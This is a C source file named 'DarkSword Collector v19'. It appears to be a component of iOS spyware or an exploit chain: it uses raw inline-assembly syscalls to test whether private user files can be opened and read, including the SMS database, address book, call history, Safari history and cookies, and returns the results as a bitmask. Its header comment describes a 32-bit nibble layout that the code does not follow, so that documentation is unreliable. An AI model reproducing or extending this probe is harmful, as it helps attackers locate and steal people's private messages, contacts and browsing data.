/**
 * DarkSword Collector v19 - Comprehensive path scan
 * Tests 8 file paths, encodes status in 32-bit return
 * Each nibble (4 bits): bit3=open_ok, bit2=read_ok, bit1-0=reserved
 * Byte 0: paths 0-1, Byte 1: paths 2-3, Byte 2: paths 4-5, Byte 3: paths 6-7
 *
 * Paths:
 *  0: /etc/hosts (control)
 *  1: /var/mobile/Library/Preferences/.GlobalPreferences.plist
 *  2: /var/mobile/Library/SMS/sms.db
 *  3: /var/mobile/Library/AddressBook/AddressBook.sqlitedb
 *  4: /var/mobile/Library/CallHistoryDB/CallHistory.storedata
 *  5: /var/mobile/Library/Safari/History.db
 *  6: /var/mobile/Library/Cookies/Cookies.binarycookies
 *  7: /var/mobile/Library/Preferences/com.apple.springboard.plist
 */

static long _svc1(long n, long a) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16) : "memory");
    return x0;
}
static long _svc2(long n, long a, long b) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1) : "memory");
    return x0;
}
static long _svc3(long n, long a, long b, long c) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2) : "memory");
    return x0;
}

#define SYS_open  5
#define SYS_read  3
#define SYS_close 6

/* Returns: bit0=open_ok, bit1=read_ok */
static int _probe(const char *path) {
    int fd = (int)_svc2(SYS_open, (long)path, 0);
    if (fd < 0) return 0;
    unsigned char b = 0;
    int n = (int)_svc3(SYS_read, fd, (long)&b, 1);
    _svc1(SYS_close, fd);
    if (n > 0) return 3; /* open+read */
    return 1; /* open only */
}

int ds_start(void) {
    int r = 0;
    r |= (_probe("/etc/hosts") & 3);                           /* bits 0-1 */
    r |= (_probe("/var/mobile/Library/Preferences/.GlobalPreferences.plist") & 3) << 2;  /* bits 2-3 */
    r |= (_probe("/var/mobile/Library/SMS/sms.db") & 3) << 4;  /* bits 4-5 */
    r |= (_probe("/var/mobile/Library/AddressBook/AddressBook.sqlitedb") & 3) << 6;       /* bits 6-7 */
    r |= (_probe("/var/mobile/Library/CallHistoryDB/CallHistory.storedata") & 3) << 8;    /* bits 8-9 */
    r |= (_probe("/var/mobile/Library/Safari/History.db") & 3) << 10;  /* bits 10-11 */
    r |= (_probe("/var/mobile/Library/Cookies/Cookies.binarycookies") & 3) << 12;        /* bits 12-13 */
    r |= (_probe("/var/mobile/Library/Preferences/com.apple.springboard.plist") & 3) << 14; /* bits 14-15 */
    return r;
}
